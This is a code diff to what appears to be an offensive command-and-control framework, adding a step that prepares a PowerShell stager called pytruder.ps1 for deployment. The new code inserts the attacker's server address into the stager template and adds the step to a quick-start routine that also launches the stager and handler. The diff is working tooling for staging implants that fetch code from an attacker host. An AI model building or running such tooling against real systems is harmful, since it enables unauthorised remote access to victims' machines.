@@ -110,6 +110,25 @@ def pyterpreter_generate_function():
         format_pyterpreter(public_machine, handler_server)
 pyterpreter_generate = lib.command(pyterpreter_generate_help, 'pyterpreter_generate', pyterpreter_generate_function, False)
 
+#############################################################################################################################
+#############################################################################################################################
+
+################################################# Pytruder commands #########################################################
+
+################################################# Pyrtuder_format ###########################################################
+pytruder_format_help = '''
+This command formats pytruder.ps1 for deployement, the only thing it needs to really change is the URL
+This command does not require any args.
+'''
+def pytruder_format_ps1_funciton():
+    if attacker.public == False:
+        format_pytruder('ps1', stager)
+    elif attacker.public == True:
+        format_pytruder('ps1', stager)
+pytruder_format_ps1 = lib.command(pytruder_format_help, 'pytruder_format', pytruder_format_ps1_funciton, False)
+
+#############################################################################################################################
+
 def get_attacker_info():
     os.system('ifconfig')
     ip = input("ip of interface to use? $>")
@@ -144,25 +163,31 @@ def format_pyterpreter(attacker, listener):
             x.write(output)
 
 def format_pytruder(format, server):
-    url = "{}/pyterpreter.py".format(server.address)
-    if format == 'sh':
-        pytruder = './pytruder/pytruder.sh'
-    elif format == 'py':
-        pytruder = './pytruder/pytruder.py'
+    if not stager:
+        print("you need to set up the stager first")
     else:
-        print("error: unknown pytruder format")
-        return
-    with open(pytruder, 'r') as f:
-        output = []
-        for line in f:
-            if '$URL' in line:
-                line = line.split('$URL')
-                line = url.join(line)
-                output.append(line)
-            output.append(line)
-        with open('pytruder.{}'.format(format), 'w') as x:
-            output = '\n'.join(output)
-            x.write(output)
+        url = "http://{}:{}".format(server.ip, server.port)
+        if format == 'sh':
+            pytruder = './pytruder/pytruder.sh'
+        elif format == 'py':
+            pytruder = './pytruder/pytruder.py'
+        elif format == 'ps1':
+            pytruder = './pytruder/pytruder.ps1'
+        else:
+            print("error: unknown pytruder format")
+            return
+        with open(pytruder, 'r') as f:
+            output = []
+            for line in f:
+                try:
+                    line = line.split('$URL')
+                    line = url.join(line)
+                    output.append(line)
+                except:
+                    output.append(line)
+            with open('stager/pytruder.{}'.format(format), 'w') as x:
+                output = '\n'.join(output)
+                x.write(output)
 
 
 def quick_start_run():
@@ -172,6 +197,8 @@ def quick_start_run():
     handler_set_run()
     print("pyterpreter_generate")
     pyterpreter_generate_function()
+    print("pytruder_format")
+    pytruder_format_ps1_funciton()
     print("stager_run")
     stager_run_function()
     print("handler_run")
@@ -226,4 +253,5 @@ def main():
 
 if __name__ == '__main__':
     main()
+
 
